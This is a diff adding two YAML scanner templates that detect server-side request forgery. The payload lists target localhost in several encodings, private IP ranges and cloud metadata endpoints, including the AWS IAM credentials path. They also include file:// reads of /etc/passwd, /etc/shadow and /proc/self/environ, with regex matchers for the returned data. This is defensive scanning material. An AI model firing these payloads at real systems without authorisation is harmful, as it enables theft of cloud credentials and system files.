@@ -1,0 +1,123 @@
+id: ssrf-localhost
+
+info:
+  name: Server-Side Request Forgery (SSRF) - Localhost
+  author: ancarna
+  severity: high
+  description: Detects SSRF vulnerabilities by attempting to access localhost services
+  tags: ssrf,injection,owasp-top10
+  classification:
+    cwe-id: 918
+  reference:
+    - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
+    payloads:
+      payload:
+        # Localhost variations
+        - "http://127.0.0.1"
+        - "http://127.0.0.1:80"
+        - "http://127.0.0.1:443"
+        - "http://127.0.0.1:22"
+        - "http://127.0.0.1:8080"
+        - "http://localhost"
+        - "http://localhost:80"
+        - "http://localhost:8080"
+        - "http://[::1]"
+        - "http://[0:0:0:0:0:0:0:1]"
+        # Decimal/Octal/Hex variations
+        - "http://2130706433"
+        - "http://0x7f000001"
+        - "http://0177.0.0.1"
+        - "http://017700000001"
+        # Internal metadata endpoints
+        - "http://169.254.169.254/latest/meta-data/"
+        - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        - "http://metadata.google.internal/computeMetadata/v1/"
+        - "http://100.100.100.200/latest/meta-data/"
+        # Private IP ranges
+        - "http://10.0.0.1"
+        - "http://192.168.1.1"
+        - "http://172.16.0.1"
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        name: aws-metadata
+        regex:
+          - "ami-id"
+          - "instance-id"
+          - "instance-type"
+          - "security-credentials"
+          - "iam/"
+
+      - type: regex
+        part: body
+        name: gcp-metadata
+        regex:
+          - "computeMetadata"
+          - "service-accounts"
+          - "project-id"
+
+      - type: regex
+        part: body
+        name: ssh-banner
+        regex:
+          - "SSH-[0-9]\\.[0-9]"
+          - "OpenSSH"
+
+      - type: word
+        part: body
+        name: internal-pages
+        words:
+          - "phpinfo()"
+          - "Configuration File (php.ini) Path"
+          - "Apache/2"
+          - "nginx/"
+          - "Server:"
+        condition: or
+
+---
+id: ssrf-file-protocol
+
+info:
+  name: SSRF - File Protocol
+  author: ancarna
+  severity: critical
+  description: Detects SSRF vulnerabilities using file:// protocol
+  tags: ssrf,lfi,file-protocol
+  classification:
+    cwe-id: 918
+  reference:
+    - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
+    payloads:
+      payload:
+        - "file:///etc/passwd"
+        - "file:///etc/hosts"
+        - "file:///etc/shadow"
+        - "file:///proc/version"
+        - "file:///proc/self/environ"
+        - "file://localhost/etc/passwd"
+        - "file://127.0.0.1/etc/passwd"
+        - "file:///C:/Windows/win.ini"
+        - "file:///C:/Windows/System32/drivers/etc/hosts"
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "[a-z_][a-z0-9_-]*:x?:[0-9]+:[0-9]+:"
+          - "Linux version"
+          - "\\[fonts\\]"
+          - "\\[extensions\\]"
